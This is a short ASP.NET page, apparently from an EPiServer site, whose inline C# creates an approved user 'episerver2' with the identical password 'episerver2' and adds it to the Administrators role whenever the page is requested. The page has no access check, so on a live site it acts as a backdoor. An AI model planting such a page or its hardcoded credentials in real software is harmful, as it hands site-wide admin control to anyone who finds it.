<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Security.Policy" %>

<% 
    var user = Membership.CreateUser("episerver2", "episerver2", "episerver@episerver.com");
    user.IsApproved = true;
    
    Roles.AddUserToRole("episerver2", "Administrators"); %>